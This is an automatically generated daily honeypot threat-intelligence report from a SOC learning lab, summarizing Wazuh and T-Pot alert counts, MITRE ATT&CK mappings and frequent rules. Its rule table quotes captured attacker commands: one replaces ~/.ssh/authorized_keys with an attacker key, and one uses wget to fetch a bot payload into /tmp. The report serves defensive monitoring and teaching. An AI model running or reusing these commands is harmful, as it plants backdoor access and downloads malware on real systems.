# LearningLab01 Daily Threat Intelligence Report — 2026-09-24

Generated: 2026-09-24T13:15:05.059Z

Report window: 2026-09-23T13:15:05.032Z through 2026-09-24T13:15:05.032Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 214,094 |
| Attack-related alerts | 36,323 |
| Honeypot interactions | 189,552 |
| Authentication failures | 10,101 |
| Authentication successes | 1,449 |
| Critical alerts | 166 |
| High alerts | 1,489 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 166 critical-severity alerts require priority review.
- 1,489 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 6.97:1.
- Country attribution currently covers only 0.81% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110209: T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk (78,869 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 166 | 0.08% |
| High | 1,489 | 0.70% |
| Medium | 3,056 | 1.43% |
| Low | 209,383 | 97.80% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 10,101
- Authentication successes: 1,449
- Failure-to-success ratio: 6.97:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 21,892 | 60.27% |
| Payload delivery | 21,892 | 60.27% |
| Authentication failure | 10,101 | 27.81% |
| Command execution | 2,649 | 7.29% |
| Reconnaissance | 247 | 0.68% |
| Network scan | 170 | 0.47% |
| Malware | 90 | 0.25% |
| Web attack | 45 | 0.12% |
| SMTP attack | 11 | 0.03% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 1,737 alerts, representing 0.81% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 212,357 | 99.19% | Not geolocated |
| New Zealand | 1,290 | 0.60% | ████████████████████ |
| Germany | 277 | 0.13% | ████ |
| United Kingdom | 119 | 0.06% | ██ |
| United States | 23 | 0.01% | █ |
| Sweden | 6 | 0.00% | █ |
| Canada | 5 | 0.00% | █ |
| Russia | 5 | 0.00% | █ |
| Austria | 3 | 0.00% | █ |
| Iran | 3 | 0.00% | █ |
| Netherlands | 3 | 0.00% | █ |
| Turkey | 3 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Defense Evasion | 240 |
| Initial Access | 239 |
| Persistence | 239 |
| Privilege Escalation | 239 |
| Credential Access | 114 |
| Lateral Movement | 95 |
| Execution | 32 |
| Impact | 21 |
| Command and Control | 11 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 239 |
| Brute Force | 114 |
| Remote Services | 95 |
| Command and Scripting Interpreter | 32 |
| Stored Data Manipulation | 20 |
| Ingress Tool Transfer | 11 |
| Disable or Modify Tools | 1 |
| Endpoint Denial of Service | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110209 | 5 | 78,869 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (78,869) |
| 110213 | 4 | 45,128 | T-Pot RDP connection from [IP address] to port 3389. | tpot (45,128) |
| 110207 | 5 | 29,185 | T-Pot SentryPeer SIP activity from [IP address]:5788, method INVITE | tpot (29,185) |
| 110205 | 6 | 21,818 | T-Pot Honeytrap received a payload from [IP address] | tpot (21,818) |
| 110204 | 4 | 11,653 | T-Pot Honeytrap connection from [IP address] to port 5908 | tpot (11,653) |
| 110102 | 5 | 10,101 | Cowrie failed login from [IP address] using username enable. | tpot (10,101) |
| 110101 | 3 | 9,643 | Cowrie SSH connection from [IP address]. | tpot (9,643) |
| 110104 | 7 | 2,440 | Cowrie captured a command from [IP address]: ls /home; /bin/busybox BOTNET | tpot (2,440) |
| 110219 | 4 | 1,683 | T-Pot CiscoASA web activity from [IP address]: "GET / HTTP/1.1" 200 - | tpot (1,683) |
| 110103 | 10 | 1,210 | Cowrie accepted login from [IP address] using username system. | tpot (1,210) |
| 110201 | 4 | 407 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (407) |
| 110215 | 4 | 274 | T-Pot MiniPrint event: connection, action open_conn, Connection opened | tpot (274) |
| 533 | 7 | 238 | Listened ports status (netstat) changed (new port opened or closed). | tpot (238) |
| 110214 | 9 | 169 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (169) |
| 110109 | 13 | 166 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (166) |
| 110216 | 4 | 149 | T-Pot Mailoney received SMTP command from [IP address]:   | tpot (149) |
| 5501 | 3 | 144 | PAM: Login session opened. | tpot (142), wazuh (2) |
| 5502 | 3 | 127 | PAM: Login session closed. | tpot (125), wazuh (2) |
| 110106 | 10 | 114 | Cowrie detected repeated failed logins from [IP address]. | tpot (114) |
| 5715 | 3 | 95 | sshd: authentication success. | tpot (94), wazuh (1) |
| 110212 | 10 | 74 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (74) |
| 110105 | 12 | 47 | Cowrie captured a file download from [IP address]. | tpot (47) |
| 110223 | 5 | 45 | T-Pot HoneyAML received  request from  to  on port . | tpot (45) |
| 86003 | 3 | 45 | Docker: Error message | tpot (45) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110221 | 7 | 39 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /SETTINGS.CFG HTTP/1.1" 404 - | tpot (39) |
| 110108 | 12 | 32 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (32) |
| 203 | 9 | 32 | Agent event queue is full. Events may be lost. | tpot (32) |
| 110208 | 7 | 24 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:29179 | tpot (24) |
| 592 | 8 | 20 | Log file size reduced. | tpot (20) |
| 110220 | 8 | 18 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (18) |
| 110107 | 12 | 11 | Cowrie captured a probable payload-retrieval command from [IP address]: wget -q http://[IP address]:6881PROXYONUPDATE:7332/bot.$m -O /tmp/.z 2 > /dev/null | tpot (11) |
| 110217 | 7 | 11 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH NTLM  | tpot (11) |
| 202 | 7 | 10 | Agent event queue is 90% full. | tpot (10) |
| 205 | 3 | 10 | Agent event queue is back to normal load. | tpot (10) |
| 110222 | 9 | 3 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (3) |
| 2904 | 7 | 3 | Dpkg (Debian Package) half configured. | tpot (3) |
| 11 | 4 | 2 | Unknown | tpot (2) |
| 110218 | 9 | 2 | T-Pot Mailoney detected repeated SMTP activity from one source. | tpot (2) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 2902 | 7 | 2 | New dpkg (Debian Package) installed. | tpot (2) |
| 110211 | 9 | 1 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (1) |
| 19010 | 3 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 5108 | 12 | 1 | System running out of memory. Availability of the system is in risk. | tpot (1) |
| 5742 | 4 | 1 | sshd: connection timed out | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
